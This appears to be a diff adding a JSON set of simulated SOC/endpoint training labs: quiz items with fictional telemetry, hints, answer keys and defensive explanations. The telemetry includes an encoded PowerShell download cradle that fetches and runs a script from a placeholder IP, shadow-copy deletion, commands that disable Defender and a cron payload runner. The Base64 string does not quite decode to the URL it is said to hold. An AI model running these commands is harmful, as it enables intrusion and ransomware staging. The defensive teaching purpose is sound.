@@ -1,0 +1,301 @@
+{
+  "category": "SOC/Endpoint",
+  "labs": [
+    {
+      "id": "soc-01",
+      "lab_type": "soc",
+      "title": "Endpoint Defense — Obfuscated Base64 PowerShell (-enc)",
+      "category": "SOC/Endpoint",
+      "difficulty": "Intermediate",
+      "estimated_minutes": 12,
+      "mitre_attack": ["T1059.001 PowerShell", "T1027 Obfuscated Files or Information", "T1105 Ingress Tool Transfer"],
+      "learning_objectives": [
+        "Decode UTF-16LE Base64 PowerShell command lines",
+        "Correlate Sysmon process (EID 1) and network (EID 3) events",
+        "Build a Sigma-style detection for encoded PowerShell from suspicious parents"
+      ],
+      "scenario": "SIMULATED TRAINING EXAMPLE (fictional). A workstation triggered an EDR alert on a suspicious PowerShell invocation. Decode the execution telemetry and determine the threat.",
+      "telemetry": "=== SIMULATED TRAINING EXAMPLE - NOT REAL TELEMETRY ===\n=== SYSPMON EVENT ID 1 ===\nUtcTime: 2026-10-09 14:22:07.441\nProcessGuid: 00000000-0000-0000-0000-000000000000\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nCommandLine: powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAwAC4AMgAuADQANAAdABhAGcAZQAuAHAAcwAxACcAKQA=\nParentImage: C:\\Program Files\\Common Files\\updater.exe\n=== SYSPMON EVENT ID 3 (Network) ===\npowershell.exe -> 192.0.2.44:80 (GET /stage.ps1) 200 OK\nDestinationPort: 80, Protocol: TCP\n=== BASE64 DECODE (UTF-16LE) ===\nIEX (New-Object Net.WebClient).DownloadString('http://192.0.2.44/stage.ps1')",
+      "iocs": ["-enc", "powershell.exe -nop -w hidden", "192.0.2.44:80", "updater.exe", "IEX DownloadString"],
+      "mitre_tactics": ["TA0002 Execution", "TA0005 Defense Evasion", "TA0011 Command & Control"],
+      "questions": [
+        {
+          "question": "Decoding the -enc payload reveals which malicious behavior?",
+          "options": [
+            "A benign Windows Update check that performs no network activity, writes nothing to disk, and leaves no forensic artifacts behind on the host",
+            "A scheduled task that enumerates local user accounts and writes the enumeration results to the Windows event log for review",
+            "An IEX download cradle fetching and executing remote script from http://192.0.2.44 — a fileless PowerShell loader with C2 beaconing",
+            "A certificate enrollment request sent to an internal enterprise CA over TCP port 80 with no payload"
+          ],
+          "correct_index": 2,
+          "hints": [
+            "The -enc flag means Base64-encoded UTF-16LE. Decode it first.",
+            "Look for 'IEX' and 'Net.WebClient' in the decoded string.",
+            "Correlate Event ID 1 (process) with Event ID 3 (network) — where did the shell connect?"
+          ],
+          "explanation": "NIST SP 800-61r2 / SANS PICERL — Detection: The -enc parameter hides the command from command-line auditing. Decoded, it is IEX (New-Object Net.WebClient).DownloadString(...) — a fileless download cradle that pulls and executes script in memory. Sysmon EID 3 confirms the outbound connection to 192.0.2.44:80, establishing C2 beaconing. Sigma rule: detect powershell.exe with '-enc' AND parent not explorer.exe. Containment: isolate host, kill process tree (updater.exe -> powershell.exe), block 192.0.2.44 egress, capture memory image before reboot for fileless artifact recovery."
+        }
+      ]
+    },
+    {
+      "id": "endpoint-01",
+      "lab_type": "soc",
+      "title": "Suspicious Service Install on a Jump Host",
+      "category": "SOC/Endpoint",
+      "difficulty": "Beginner",
+      "estimated_minutes": 10,
+      "mitre_attack": ["T1543.003 Create or Modify System Process: Windows Service", "T1078 Valid Accounts"],
+      "learning_objectives": [
+        "Interpret Windows Event ID 7045 (service install) telemetry",
+        "Distinguish administrative tooling from masquerading malware services",
+        "Baseline legitimate service installs to reduce alert noise"
+      ],
+      "scenario": "SIMULATED TRAINING EXAMPLE (fictional). On-call analysts received a midnight alert: a new service was installed on the SSH jump host by an unusual process. No change ticket exists.",
+      "telemetry": "=== SIMULATED TRAINING EXAMPLE - NOT REAL TELEMETRY ===\n=== EVENT ID 7045 (Service Control Manager) ===\nServiceName: SysMonHelper\nImagePath: C:\\Users\\Public\\svc.exe\nServiceType: own process\nStartType: auto start\nAccount: LocalSystem\nTime: 02:47:13, Host: JUMPHOST-01\n=== PRECEDING EVENTS (same host) ===\n4624 LogonType 3 (network) user: jhelpdesk, source 198.51.100.77\nSysmon EID 1: powershell.exe -c New-Service ...; sc.exe start SysMonHelper\n=== FILE DETAIL ===\nC:\\Users\\Public\\svc.exe — unsigned, PE, dropped 02:46:55\nVT-style context (SIMULATED): low prevalence binary, packed sections",
+      "iocs": ["SysMonHelper", "C:\\Users\\Public\\svc.exe", "198.51.100.77", "unsigned PE in Users\\Public"],
+      "mitre_tactics": ["TA0003 Persistence", "TA0004 Privilege Escalation"],
+      "questions": [
+        {
+          "question": "Which combination of artifacts makes this service install malicious rather than routine admin work?",
+          "options": [
+            "The service name contains 'SysMon' which is a well-known legitimate monitoring tool",
+            "The binary path is a per-user directory (C:\\Users\\Public), the PE is unsigned and low-prevalence, and it was installed at 02:47 with no change ticket",
+            "Service installed as LocalSystem is normal because most Windows services run as LocalSystem",
+            "Auto-start services are always suspicious because administrators use manual services only"
+          ],
+          "correct_index": 1,
+          "hints": [
+            "Where do legitimate system services usually live? Compare with C:\\Users\\Public.",
+            "Is 'SysMonHelper' actually related to Sysmon? Who installed it and by which process?",
+            "Combine: unsigned + low-prevalence + odd hour + no change ticket."
+          ],
+          "explanation": "Legitimate services almost always install from Program Files or Windows directories, are typically signed, and follow change management. A LocalSystem service whose binary sits in a world-writable per-user path (C:\\Users\\Public) — dropped moments earlier by powershell.exe after an out-of-hours network logon, with a name chosen to mimic monitoring tooling (masquerading, T1036) — is the classic pattern for malware persistence and privilege abuse. Containment: stop and delete the service, quarantine svc.exe, isolate the host, rotate jhelpdesk credentials, and investigate 198.51.100.77."
+        },
+        {
+          "question": "What hardening step would PREVENT this specific persistence technique even if the attacker had local admin?",
+          "options": [
+            "Disable the Windows Firewall because the attack came over SMB",
+            "Restrict service creation via Group Policy so only SYSTEM/approved principals can install services, and block unsigned binaries from per-user paths",
+            "Rename the local Administrator account so attackers cannot guess it",
+            "Increase the Windows event log size so 7045 events cannot be lost"
+          ],
+          "correct_index": 1,
+          "hints": [
+            "The abuse primitive is the right to CREATE a service — where is that controlled?",
+            "What secondary control would stop the unsigned per-user binary from running?",
+            "Logging more data detects the issue but does not prevent it."
+          ],
+          "explanation": "Service creation is a privilege-gated operation: restricting SeCreateServicePrivilege / using attack-surface-reduction or application-control rules (block execution of unsigned binaries from user-writable paths) breaks this exact chain even when the attacker has captured an admin token. Bigger logs and account renames are detection or hygiene measures, not prevention; the firewall is irrelevant to local persistence."
+        }
+      ]
+    },
+    {
+      "id": "endpoint-02",
+      "lab_type": "soc",
+      "title": "Ransomware Preparation on a File Server",
+      "category": "SOC/Endpoint",
+      "difficulty": "Intermediate",
+      "estimated_minutes": 12,
+      "mitre_attack": ["T1486 Data Encrypted for Impact", "T1490 Inhibit System Recovery", "T1489 Service Stop"],
+      "learning_objectives": [
+        "Recognize pre-encryption ransomware staging (shadow copy deletion, service stops)",
+        "Prioritize alerts in the ransomware kill chain before impact",
+        "Apply segmentation and immutable backups for recovery"
+      ],
+      "scenario": "SIMULATED TRAINING EXAMPLE (fictional). An EDR heuristic fired on a batch of suspicious commands on FILESRV-02. Encrypted-file alerts have NOT yet appeared — your actions now decide whether impact occurs.",
+      "telemetry": "=== SIMULATED TRAINING EXAMPLE - NOT REAL TELEMETRY ===\n=== SYSMON EID 1 (sequence, 90 seconds) ===\n[02:13:04] cmd.exe /c vssadmin delete shadows /all /quiet\n[02:13:19] cmd.exe /c wmic shadowcopy delete\n[02:13:33] net stop \"BackupSvc\" /y\n[02:13:41] net stop \"DefWatch\" /y\n[02:13:52] powershell.exe -c Set-MpPreference -DisableRealtime $true\n[02:14:10] psexec.exe @filesrv-list.txt -c encryptor.exe  (SIMULATED tool name)\n=== PROCESS TREE ===\nParent of cmd.exe: rdpclip.exe (RDP session of user svc_backup)\n=== NETWORK ===\n42 SMB connections to ADMIN$ shares across subnet 10.10.20.0/24 in 60s\nNOTE: no mass file-rename/encryption events detected yet",
+      "iocs": ["vssadmin delete shadows /quiet", "wmic shadowcopy delete", "Set-MpPreference -DisableRealtime", "svc_backup RDP session"],
+      "mitre_tactics": ["TA0011 Command & Control", "TA0040 Impact", "TA0005 Defense Evasion"],
+      "questions": [
+        {
+          "question": "What does this command sequence indicate, and what is the correct IMMEDIATE response?",
+          "options": [
+            "Routine backup maintenance performed by svc_backup; close the alert since encryption has not started",
+            "Pre-encryption staging: shadow copies destroyed, backup/AV services stopped, fleet-wide SMB push — isolate the host and kill the session NOW",
+            "A failed Windows Update that stopped services; schedule a reboot",
+            "An authorized penetration test; check the calendar and wait for its end date"
+          ],
+          "correct_index": 1,
+          "hints": [
+            "Why would an attacker delete shadow copies and stop backup services BEFORE encrypting?",
+            "psexec pushing encryptor.exe to a subnet list means what about the blast radius?",
+            "'No encryption yet' means you are early — the window to act is NOW."
+          ],
+          "explanation": "vssadmin delete shadows + wmic shadowcopy delete + stopping backup/AV services is the standard ransomware pre-impact playbook (T1490 Inhibit System Recovery): destroying restore points before detonating the encryptor removes the victim's recovery options. The 42 parallel ADMIN$ SMB pushes show wide distribution beginning. With encryption not yet observed, the SOC is in the rare position to prevent impact: network-isolate FILESRV-02, terminate the svc_backup RDP session, block the psexec push, disable svc_backup, and verify immutable/offline backups. Post-incident: hunt the initial access vector (likely svc_backup credential theft)."
+        },
+        {
+          "question": "Which backup strategy lets the organization RECOVER even if encryption completes before containment?",
+          "options": [
+            "Nightly backups stored on a SMB share on the same VLAN with domain-admin write access",
+            "Immutable or offline backups (object lock / air-gapped) with restore tests, inaccessible from the compromised credentials",
+            "Backing up to a second folder on the same file server with a longer retention period",
+            "Relying on Volume Shadow Copies as the sole recovery mechanism"
+          ],
+          "correct_index": 1,
+          "hints": [
+            "The attacker explicitly deleted shadow copies and stopped backup services — what survives that?",
+            "If backups are reachable with stolen domain credentials, what happens to them?",
+            "An untested backup is functionally equivalent to no backup."
+          ],
+          "explanation": "Modern ransomware operators deliberately hunt and destroy accessible backups (shadow copies, network shares, backup services) using the very credentials they stole. Only immutable (WORM/object-lock) or physically offline backups that the compromised identity cannot modify survive this stage. Same-VLAN SMB backups and shadow copies are explicitly targeted in the observed telemetry. Regular restore testing is what converts 'backup' into 'recovery capability'."
+        }
+      ]
+    },
+    {
+      "id": "endpoint-03",
+      "lab_type": "soc",
+      "title": "LSASS Memory Access — Credential Dumping Attempt",
+      "category": "SOC/Endpoint",
+      "difficulty": "Advanced",
+      "estimated_minutes": 14,
+      "mitre_attack": ["T1003.001 OS Credential Dumping: LSASS Memory", "T1136 Create Account"],
+      "learning_objectives": [
+        "Read Sysmon Event ID 10 (process access) targeting lsass.exe",
+        "Distinguish credential dumping from benign AV access patterns",
+        "Deploy RunAsPPL and credential-guard mitigations"
+      ],
+      "scenario": "SIMULATED TRAINING EXAMPLE (fictional). A high-fidelity EDR rule fired on suspicious memory access against LSASS. Two programs touched lsass.exe within the same minute — determine which one was malicious and why.",
+      "telemetry": "=== SIMULATED TRAINING EXAMPLE - NOT REAL TELEMETRY ===\n=== SYSMON EVENT ID 10 (ProcessAccess) #1 ===\nSourceImage: C:\\Program Files\\AVProvider\\avsvc.exe\nTargetImage: C:\\Windows\\System32\\lsass.exe\nGrantedAccess: 0x1410 (read memory subset — AV scanning context)\nCallTrace: avsvc.exe + ntdll.dll\n=== SYSMON EVENT ID 10 (ProcessAccess) #2 ===\nSourceImage: C:\\Users\\dev.user\\AppData\\Local\\Temp\\tool64.exe\nTargetImage: C:\\Windows\\System32\\lsass.exe\nGrantedAccess: 0x1010 (PROCESS_VM_READ | PROCESS_VM_WRITE...)\nCallTrace: tool64.exe + dbghelp.dll\nParentImage: cmd.exe (interactive session of dev.user)\n=== CONTEXT ===\ntool64.exe: unsigned, dropped 4 minutes ago via archive from personal cloud drive\nProcess integrity level: High; dev.user has local admin (developer workstation exception)",
+      "iocs": ["tool64.exe", "0x1010 LSASS access", "dbghelp.dll from per-user temp", "unsigned binary from personal cloud"],
+      "mitre_tactics": ["TA0006 Credential Access"],
+      "questions": [
+        {
+          "question": "Which Sysmon field combination identifies the malicious access, differentiating it from the legitimate AV touch?",
+          "options": [
+            "Both are malicious: any process touching lsass.exe memory should be blocked and the host isolated immediately",
+            "GrantedAccess 0x1010 from an unsigned per-user binary (tool64.exe) with a dbghelp.dll call trace — vs the AV's 0x1410 read-scan from Program Files",
+            "The AV process is the malicious one because security software should never read LSASS memory",
+            "Integrity level High is the discriminator — High integrity processes are always trusted to touch LSASS"
+          ],
+          "correct_index": 1,
+          "hints": [
+            "Compare SourceImage paths: Program Files vs per-user Temp.",
+            "Compare GrantedAccess masks: what does 0x1010 include that pure scanning does not?",
+            "dbghelp.dll (MiniDumpWriteDump support) loaded from an unsigned binary is a hallmark of which tool class?"
+          ],
+          "explanation": "LSASS holds cached credentials, so memory access to it is among the highest-severity signals. The discriminator is context: legitimate AV products open lsass.exe with constrained read masks from signed binaries in protected paths (allow-listed); an unsigned binary in the user's Temp, launched from an interactive shell, requesting 0x1010 (VM_READ/WRITE + query) with dbghelp.dll in the call trace is textbook Mimikatz-style credential dumping (T1003.001). Response: kill and quarantine tool64.exe, isolate the host, treat ALL credentials used on that machine as compromised (LSASS exposes cached domain creds), rotate them, and hunt for lateral movement with the dumped material."
+        },
+        {
+          "question": "Which mitigation would have BLOCKED the dump even though the user held local admin?",
+          "options": [
+            "Enabling LSA Protection (RunAsPPL) so LSASS runs as a protected process that non-PPL signed binaries cannot open",
+            "Disabling the local cmd.exe executable via policy",
+            "Increasing the Windows event log size for Sysmon EID 10 retention",
+            "Moving the developer to a non-admin account and hoping they do not need admin again"
+          ],
+          "correct_index": 0,
+          "hints": [
+            "Local admin can ordinarily open any process — what changes the rules for LSASS specifically?",
+            "Which Windows feature makes LSASS memory inaccessible to ordinary (non-protected) processes, even administrators?",
+            "Detection ≠ prevention: which option actually blocks the access?"
+          ],
+          "explanation": "RunAsPPL (LSA Protection) runs LSASS as a Protected Process Light: ordinary processes — even those holding an administrator token — cannot open its memory with the required access masks; only PPL-signed binaries can. Combined with Credential Guard (virtualization-based protection of secrets) this breaks commodity dumpers like the observed tool64.exe. Log retention and cmd.exe removal do not block the primitive; least-privilege is good hygiene but does not protect machines where developers legitimately hold admin."
+        }
+      ]
+    },
+    {
+      "id": "endpoint-04",
+      "lab_type": "soc",
+      "title": "EDR Tampering — Defender Real-Time Monitoring Disabled",
+      "category": "SOC/Endpoint",
+      "difficulty": "Intermediate",
+      "estimated_minutes": 11,
+      "mitre_attack": ["T1562.001 Impair Defenses: Disable or Modify Tools", "T1112 Modify Registry"],
+      "learning_objectives": [
+        "Detect security-tool tampering via PowerShell and registry telemetry",
+        "Understand tamper protection and its detection events",
+        "Respond to agent-disable attempts before deployment of payloads"
+      ],
+      "scenario": "SIMULATED TRAINING EXAMPLE (fictional). The monitoring console shows a fleet endpoint flipped to 'real-time protection: off'. The analyst must reconstruct who/what changed it and whether tamper protection worked.",
+      "telemetry": "=== SIMULATED TRAINING EXAMPLE - NOT REAL TELEMETRY ===\n=== POWERSHELL SCRIPT BLOCK LOG (4104) ===\nScriptBlock: Set-MpPreference -DisableRealtimeMonitoring $true\nInvocation: WIN-WS-1123, user: jcontractor, host process: powershell.exe (PID 4128)\nParent: wscript.exe C:\\Users\\jcontractor\\AppData\\Roaming\\update.vbs\n=== WINDOWS DEFENDER OPERATIONAL LOG ===\nEvent 5001: Real-time protection is disabled. (twice in 5 minutes)\nEvent 5007: Configuration change (DisableAntiSpyware -> 1) attempted\n=== REGISTRY (Sysmon EID 12/13) ===\nHKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\DisableAntiSpyware = 1 (set)\nTargetValue deleted 90 seconds later (auto-revert by policy engine?)\n=== AGENT STATUS ===\nEndpoint agent: CONNECTED (check-ins continue), RTP: off at sensor, policy shows ON",
+      "iocs": ["Set-MpPreference -DisableRealtimeMonitoring", "update.vbs via wscript.exe", "DisableAntiSpyware registry write", "Event 5001 x2"],
+      "mitre_tactics": ["TA0005 Defense Evasion", "TA0003 Persistence"],
+      "questions": [
+        {
+          "question": "The registry value was automatically reverted and the agent kept checking in. Is the endpoint safe, and what does this sequence prove?",
+          "options": [
+            "Yes — the configuration was restored, so no attack occurred and the ticket can be closed",
+            "No — automated tampering attempts indicate active hands-on-keyboard attacker work; the revert proves tamper protection, not safety. Investigate the parent chain (wscript -> update.vbs)",
+            "The events are contradictory and therefore fake; Sysmon cannot log 5001 twice in five minutes",
+            "It is a false positive because contractors routinely disable Defender while installing software"
+          ],
+          "correct_index": 1,
+          "hints": [
+            "Who RAN the command — the policy engine or a user session? Trace the parent chain.",
+            "Does 'defense restored' mean 'attacker gone'? What step typically follows disabling RTP?",
+            "wscript.exe running a .vbs from Roaming is what kind of indicator?"
+          ],
+          "explanation": "Tamper protection worked: the DisableAntiSpyware write was reverted and the sensor stayed connected. But the attempt itself — Set-MpPreference invoked by a user session from wscript.exe running update.vbs out of the Roaming profile — is hands-on attacker behavior (T1562.001) and usually precedes payload staging that real-time protection would have caught. The correct response is to treat the host as suspect: isolate, capture update.vbs and the script's origin, review everything jcontractor ran in the surrounding window, and rotate any credentials used in that session. 'The guard was pushed and recovered' is not 'nobody attacked'."
+        },
+        {
+          "question": "Which configuration makes tamper attempts like this FAIL cleanly in the first place?",
+          "options": [
+            "Enable built-in Tamper Protection and restrict Set-MpPreference to SYSTEM-context signed management agents (SCCM/Intune), with policy-enforced RTP that standard admin sessions cannot disable",
+            "Delete powershell.exe from all workstations",
+            "Grant contractors local admin so they can fix Defender themselves",
+            "Turn off Windows event logging for the Defender operational channel to reduce noise"
+          ],
+          "correct_index": 0,
+          "hints": [
+            "Which of these changes who is ALLOWED to change the configuration?",
+            "Tamper Protection specifically blocks which class of modification?",
+            "Reducing logs reduces visibility — never the answer."
+          ],
+          "explanation": "Microsoft Defender's Tamper Protection blocks modifications to real-time protection, and central management (SCCM/Intune with signed policy engines) ensures only SYSTEM-context management agents alter AV state. Removing PowerShell entirely breaks legitimate ops and is trivially bypassed by portable runtimes; giving users admin expands attack surface; disabling security logging blinds detection. Defense-in-depth = prevent the change (tamper protection), restrict the changers (policy + least privilege), and alert on the attempt (5001/5007 events feeding the SOC)."
+        }
+      ]
+    },
+    {
+      "id": "endpoint-05",
+      "lab_type": "soc",
+      "title": "Linux Persistence via Cron and SSH authorized_keys",
+      "category": "SOC/Endpoint",
+      "difficulty": "Intermediate",
+      "estimated_minutes": 12,
+      "mitre_attack": ["T1053.003 Scheduled Task/Job: Cron", "T1098.004 Account Manipulation: SSH Authorized Keys", "T1078 Valid Accounts"],
+      "learning_objectives": [
+        "Audit Linux persistence points: cron, systemd units, authorized_keys",
+        "Correlate auth logs with file-drop telemetry",
+        "Hunt for key-based backdoors on production Linux hosts"
+      ],
+      "scenario": "SIMULATED TRAINING EXAMPLE (fictional). During a routine audit of WEBPRD-03 (Ubuntu), the security team found suspicious persistence artifacts placed two days after an anomalous SSH login.",
+      "telemetry": "=== SIMULATED TRAINING EXAMPLE - NOT REAL TELEMETRY ===\n=== AUTH LOG (ssh) ===\nOct 7 03:12:44 sshd[8812]: Accepted publickey for deploy from 203.0.113.88 port 51234 ssh2\n(3 failed password attempts for root from same IP immediately before)\nNOTE: deploy normally authenticates from CI network 10.20.30.0/24\n=== FILE DROP TIMELINE ===\nOct 7 03:14:02 — /home/deploy/.ssh/authorized_keys modified (key appended)\nnew key: ssh-ed25519 AAAA...SIMULATED... comment 'maint@devbox'\nOct 7 03:14:51 — /etc/cron.d/sysstat-sync created (mode 0644 root:root)\ncontent: */15 * * * * root /usr/local/bin/.sysupdate >/dev/null 2>&1\nOct 7 03:15:10 — /usr/local/bin/.sysupdate created (shell script, obfuscated base64 payload, SIMULATED)\n=== CURRENT STATE ===\nNo outbound connections observed YET from WEBPRD-03\nauth.log shows the cron entry executed at the last quarter-hour mark",
+      "iocs": ["203.0.113.88", "authorized_keys key 'maint@devbox'", "/etc/cron.d/sysstat-sync", "/usr/local/bin/.sysupdate"],
+      "mitre_tactics": ["TA0003 Persistence", "TA0006 Credential Access", "TA0011 Command & Control"],
+      "questions": [
+        {
+          "question": "Which persistence artifact guarantees the attacker retains access EVEN IF the deploy password is rotated and cron is removed?",
+          "options": [
+            "The base64 payload in /usr/local/bin/.sysupdate",
+            "The appended ed25519 public key in /home/deploy/.ssh/authorized_keys",
+            "The cron entry in /etc/cron.d/sysstat-sync",
+            "The failed root password attempts from 203.0.113.88"
+          ],
+          "correct_index": 1,
+          "hints": [
+            "Password rotation invalidates passwords — which artifacts are password-independent?",
+            "An authorized SSH key authenticates with a KEY, not a password. What must be removed to revoke it?",
+            "Cron is just a scheduler; which artifact IS the access itself?"
+          ],
+          "explanation": "An attacker-controlled public key appended to authorized_keys (T1098.004) is self-contained access: it survives password rotations and does not need cron to be used. The correct response is to remove the key (and any other rogue keys), not just rotate the password. Cron + .sysupdate is execution/persistence of the PAYLOAD, and the failed root attempts are just the attacker's abandoned path. Full remediation: purge the key, delete cron/unit and payload, rotate deploy credentials, block 203.0.113.88, and require key-rotation + 2FA for the deploy pipeline."
+        },
+        {
+          "question": "The SSH login came from 203.0.113.88 while CI connections normally originate from 10.20.30.0/24. What detection would have caught this EARLIEST?",
+          "options": [
+            "A geolocation/IP-reputation alert for successful public-key logins outside the known CI subnet for the deploy principal",
+            "Waiting for the base64 payload to beacon and alerting on the C2 connection",
+            "An alert on failed root password attempts, because attackers never succeed after failures",
+            "Weekly manual reviews of /etc/cron.d by the operations team"
+          ],
+          "correct_index": 0,
+          "hints": [
+            "What is 'normal' for the deploy service principal? Authentication FROM where?",
+            "The fastest signal is at the moment of initial access — which log records it?",
+            "Beaconing means the attacker already finished setting up — too late."
+          ],
+          "explanation": "Behavioral baselining on the authentication source is the earliest, cheapest tripwire: 'deploy' should never authenticate from outside the CI subnet. Alerting on that first successful login (03:12:44) would have preceded every persistence artifact by minutes. Waiting for C2 means the intrusion is fully established; failed-password alerts miss key-based compromises entirely; and manual weekly cron reviews are far too slow against an automated chain (login to persistence in under 3 minutes)."
+        }
+      ]
+    }
+  ]
+}
